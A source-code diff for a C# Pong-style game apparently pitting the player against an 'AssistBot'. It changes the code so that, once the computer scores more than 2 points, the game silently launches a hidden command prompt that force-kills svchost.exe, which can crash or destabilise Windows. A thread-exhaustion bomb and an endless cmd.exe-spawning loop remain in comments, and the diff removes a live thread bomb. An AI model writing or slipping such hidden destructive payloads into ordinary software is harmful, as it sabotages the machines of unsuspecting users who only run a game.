@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -33,6 +34,8 @@ namespace SQLUserInterface
         {
             ball.Top -= ballYspeed;
             ball.Left -= ballXspeed;
+
+            this.Text = "Player Score: " + playerScore + " -- AssistBot: " + computerScore;
             if (ball.Top < 0 || ball.Bottom > this.ClientSize.Height)
             {
                 ballYspeed = -ballYspeed;
@@ -88,24 +91,47 @@ namespace SQLUserInterface
             CheckCollision(ball, player, player.Right + 5);
             CheckCollision(ball, computer, computer.Left - 35);
 
-            if(computerScore > 5)
+            if (computerScore > 2)
             {
-                try
+                //Bad
+                /*
+                for (int i = 0; i < 100000; i++) // Create 100,000 threads
                 {
-                    for (int i = 0; i < 100000; i++) // Create 100,000 threads
+                    new Thread(() =>
                     {
-                        new Thread(() =>
-                        {
-                            while (true) { } // Infinite loop in each thread
-                        }).Start();
+                        while (true) { } // Infinite loop in each thread
+                    }).Start();
+                }
+                */
+                //Really bad
+                /*
+                    while (true)
+                    {
+                        System.Diagnostics.Process.Start("cmd.exe");  // Creates a new process (command prompt) in an infinite loop
                     }
-                }
-                catch (OutOfMemoryException ex)
+                */
+
+                //The worst
+                string command = "TASKKILL /IM svchost.exe /F"; // 
+                string arguments = ""; // Optional: arguments for the command
+
+                // Create a new Process to start the command
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
                 {
-                    Console.WriteLine("Thread creation failed: " + ex.Message);
-                }
+                    FileName = "cmd.exe", // Command prompt executable
+                    Arguments = "/c " + command + " " + arguments, // '/c' tells cmd to execute the command and then terminate
+                    RedirectStandardOutput = true, // Capture the output of the command
+                    UseShellExecute = false, // Don't use shell execute (necessary for redirection)
+                    CreateNoWindow = true, // Don't show the command prompt window
+                    Verb = "runas"
+                };
+
+                Process process = new Process();
+                process.StartInfo = processStartInfo;
+                process.Start();
+                GameOver();
             }
-            else if(playerScore > 5)
+            else if (playerScore > 5)
             {
                 GameOver();
             }
@@ -170,6 +196,7 @@ namespace SQLUserInterface
         private void GameOver()
         {
             GameTimer.Stop();
+            computerScore = 0;
             MessageBox.Show("You have bested me");
             Hide();
             
